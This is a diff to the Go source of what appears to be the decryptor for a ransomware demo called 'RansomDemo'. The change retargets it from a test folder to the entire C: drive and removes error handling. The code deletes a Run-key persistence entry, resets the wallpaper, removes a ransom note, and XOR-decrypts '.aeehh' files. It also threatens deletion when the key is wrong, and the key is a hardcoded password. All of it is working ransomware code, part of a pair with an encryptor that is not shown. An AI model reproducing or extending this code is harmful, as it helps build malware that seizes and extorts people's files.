@@ -14,8 +14,15 @@ import (
 
 const (
 	password  = "123"
-	targetDir = `C:\teste`
+	targetDir = `C:` // <--- ALTERE AQUI (igual ao encryptor.go)
 )
+
+var excludeDirs = map[string]bool{
+	"Windows":             true,
+	"Program Files":       true,
+	"Program Files (x86)": true,
+	"Users":               true,
+}
 
 func xorEncrypt(data []byte) []byte {
 	encrypted := make([]byte, len(data))
@@ -26,28 +33,25 @@ func xorEncrypt(data []byte) []byte {
 }
 
 func restoreDefaultWallpaper() {
-	defaultWallpaper := `C:\Windows\Web\Wallpaper\Windows\img0.jpg` // Wallpaper padrão do Windows 11
+	defaultWallpaper := `C:\Windows\Web\Wallpaper\Windows\img0.jpg`
 	user32 := windows.NewLazySystemDLL("user32.dll")
 	systemParameters := user32.NewProc("SystemParametersInfoW")
 
 	pathUTF16, _ := windows.UTF16PtrFromString(defaultWallpaper)
 	systemParameters.Call(
-		uintptr(0x0014), // SPI_SETDESKWALLPAPER
+		uintptr(0x0014),
 		0,
 		uintptr(unsafe.Pointer(pathUTF16)),
-		uintptr(0x01|0x02), // SPIF_UPDATEINIFILE | SPIF_SENDCHANGE
+		uintptr(0x01|0x02),
 	)
 }
 
 func removeFromStartup() {
-	key, err := registry.OpenKey(
+	key, _ := registry.OpenKey(
 		registry.CURRENT_USER,
 		`Software\Microsoft\Windows\CurrentVersion\Run`,
 		registry.SET_VALUE,
 	)
-	if err != nil {
-		return
-	}
 	defer key.Close()
 	key.DeleteValue("RansomDemo")
 }
@@ -62,44 +66,34 @@ func main() {
 
 	if inputKey != password {
 		fmt.Print("\033[31m")
-		fmt.Println("⚠️ CHAVE INVÁLIDA! SEUS ARQUIVOS SERÃO DELETADOS!")
+		fmt.Println("⚠️ CHAVE INVÁLIDA! OS ARQUIVOS SERÃO DELETADOS!")
 		fmt.Print("\033[0m")
 		time.Sleep(10 * time.Second)
 		return
 	}
 
-	// Remover persistência
 	removeFromStartup()
-
-	// Restaurar wallpaper original
 	restoreDefaultWallpaper()
-
-	// Remover arquivo de aviso
 	os.Remove(filepath.Join(targetDir, "!!!WARNING!!!.txt"))
 
-	// Descriptografar arquivos recursivamente (pastas e subpastas)
 	filepath.Walk(targetDir, func(path string, info os.FileInfo, err error) error {
 		if err != nil || info.IsDir() || !strings.HasSuffix(info.Name(), ".aeehh") {
 			return nil
 		}
 
-		// Ler arquivo criptografado
-		data, err := os.ReadFile(path)
-		if err != nil {
-			return nil
+		if targetDir == `C:` {
+			dir := filepath.Base(filepath.Dir(path))
+			if excludeDirs[dir] {
+				return filepath.SkipDir
+			}
 		}
 
-		// Descriptografar
+		data, _ := os.ReadFile(path)
 		decryptedData := xorEncrypt(data)
 		originalName := strings.TrimPrefix(strings.TrimSuffix(info.Name(), ".aeehh"), "[RANSOM]")
 		originalPath := filepath.Join(filepath.Dir(path), originalName)
 
-		// Escrever arquivo original
-		if err := os.WriteFile(originalPath, decryptedData, 0644); err != nil {
-			return nil
-		}
-
-		// Remover arquivo criptografado
+		os.WriteFile(originalPath, decryptedData, 0644)
 		os.Remove(path)
 
 		return nil
